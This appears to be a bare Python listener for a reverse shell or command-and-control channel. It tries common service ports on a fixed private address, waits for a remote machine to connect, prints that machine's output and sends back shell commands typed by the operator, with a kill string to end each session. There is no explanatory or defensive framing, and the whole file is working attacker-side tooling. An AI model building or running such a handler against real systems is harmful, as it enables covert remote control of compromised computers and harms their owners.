import socket
import traceback

#  this server
HOST = '192.168.206.128'
PORTS = [80, 8080, 443, 20, 21, 23]  # try http, alt http, https, ftp cmd, ftp data, and telnet

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

KILLSTRING = "endme"

conn = False
p = 0

while not conn:
	try:
		conn = True
		print(f'Trying port {PORTS[p]} on host {HOST}')
		sock.bind((HOST, PORTS[p]))
		print(f'Listening on {PORTS[p]}')
		sock.listen()
		connection, raddr = sock.accept()
		print(f'{raddr[0]} has connected on port {PORTS[p]}')
		while True:
			data = connection.recv(1024).decode()
			if data == "yeehaw":
				print("Being your destruction.")
			else:
				print(data)
			tosend = input("$ ")
			connection.sendall(tosend.encode())
			if tosend == KILLSTRING:
				connection.shutdown()
				connection.close()
				p += 1
				if p == 6:
					p = 0
				conn = False
				break
	except Exception as e:
		print(e)
		conn = False
		p += 1
		if p == 6:
			p = 0
